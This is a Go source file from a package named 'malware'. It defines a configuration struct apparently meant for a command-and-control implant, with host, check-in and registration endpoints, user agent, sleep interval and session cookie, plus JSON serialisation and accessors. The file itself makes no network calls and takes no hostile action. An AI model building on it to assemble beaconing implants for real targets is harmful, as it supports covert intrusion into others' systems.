package malware

import "encoding/json"

type Config struct {
	Host         string `json:"Host"`
	GetEndpoint  string `json:"GetEndpoint"`
	PostEndpoint string `json:"PostEndpoint"`
	RegEndpoint  string `json:"RegEndpoint"`
	UserAgent    string `json:"UserAgent"`
	Sleep        int    `json:"Sleep"`
	Cookie       string `json:"Cookie"`
}

func NewConfig(host, getEndpoint, postEndpoint, regEndpoint, userAgent, cookie string, sleep int) *Config {
	return &Config{host,
		getEndpoint,
		postEndpoint,
		regEndpoint,
		userAgent,
		sleep,
		cookie,
	}
}

func (config *Config) MarshallTask() ([]byte, error) {
	t, err := json.Marshal(config)
	if err != nil {
		return nil, err
	}
	return t, nil
}

func (config *Config) UnmarshallTask(j []byte) error {
	err := json.Unmarshal(j, &config)
	if err != nil {
		return err
	}
	return nil
}

func (config *Config) SetCookie(cookie string) {
	config.Cookie = cookie
}

func (config *Config) SetSleep(sleep int) {
	config.Sleep = sleep
}

func (config *Config) getCookie() string {
	return config.Cookie
}

func (config *Config) getGetEndpoint() string {
	return config.GetEndpoint
}

func (config *Config) getPostEndpoint() string {
	return config.PostEndpoint
}

func (config *Config) getRegEndpoint() string {
	return config.RegEndpoint
}

func (config *Config) getUserAgent() string {
	return config.UserAgent
}

func (config *Config) getSleep() int {
	return config.Sleep
}

func (config *Config) getHost() string {
	return config.Host
}
